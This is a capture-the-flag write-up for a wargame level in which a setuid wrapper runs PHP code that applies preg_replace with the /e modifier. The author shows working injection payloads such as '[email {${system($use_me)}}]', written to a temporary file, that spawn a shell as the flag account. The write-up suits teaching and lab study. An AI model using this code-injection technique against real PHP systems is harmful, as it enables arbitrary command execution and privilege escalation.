# level09

## Challenge info

Thereâ€™s a C setuid wrapper for some vulnerable PHP code.

```
<?php

function spam($email)
{
  $email = preg_replace("/\./", " dot ", $email);
  $email = preg_replace("/@/", " AT ", $email);
  
  return $email;
}

function markup($filename, $use_me)
{
  $contents = file_get_contents($filename);

  $contents = preg_replace("/(\[email (.*)\])/e", "spam(\"\\2\")", $contents);
  $contents = preg_replace("/\[/", "<", $contents);
  $contents = preg_replace("/\]/", ">", $contents);

  return $content
}

$output = markup($argv[1], $argv[2]);

print $output;

?>
```
## Solution

The binary file flag09 present at /home/flag09 has the suid bit set. This binary is intended to execute the code shown as root.

First, and since i did not have any experience with php and regex'esm i went and tried to understand what the script does.

```
$contents = file_contents($filename) <- loads a file content to the variable contents 
```

```
$contents = preg_replace($pattern, $replacement, $subject) <- will search the subject for the regex and replace by the replacement array
```

the regex will look for something like:

```
content: [email aaa@ddd.com]
after: aaa AT ddd dot com
```

at this point i just tried to send a call to spawn a shell at the email because it will extract the email and [ brackets and probably execute, but it didnt.

```
[email system(sh)]
```

Since the experience with php is non existent, i went and read a walkthrough. 

Discovered that the <b>/e</b> will let the content of that string be evaluated if the complex curly syntax is used.

Complex curly syntax is used to access variables that are in string format.

for example

```
$abc = "123"
$name = "abc"

${$name} -> ${abc} -> 123
```

so if we inject code that spawn a shell this way (read from the file, so it's a string), we may have an arbitrary code execution.

```
echo "[email ${system(sh)}]" > /tmp/exp
./flag09 /tmp/exp
```

the above wont give us a shell because <b>${system(sh)}</b> will transfor the system(sh) in a string and not evalute it.

```
output: spam("${system(sh)}"
```

if we wrap it with curly braces it will execute and spawn a shell

```
echo "[email {${system(sh)}}]" > /tmp/exp
./flag09 /tmp/exp
```

But if we look closely at the code, we can se a second argument to the function named <b>$use_me</b> and it is passed as second command line argument.

so instead of hardcoding <b>sh</b> in the system call, we can use that argument

```
echo "[email {${system($use_me)}}]" > /tmp/exp
./flag09 /tmp/exp sh
```

This will give us a shell, but as flag09 user.

now issue

```
getflag
```

NOTE: we could be more efficient and run

```
echo "[email {${system($use_me)}}]" > /tmp/exp
./flag09 /tmp/exp getflag
```

but having a shell is always funnier.

## Flag

```
You have successfully executed getflag on a target account
```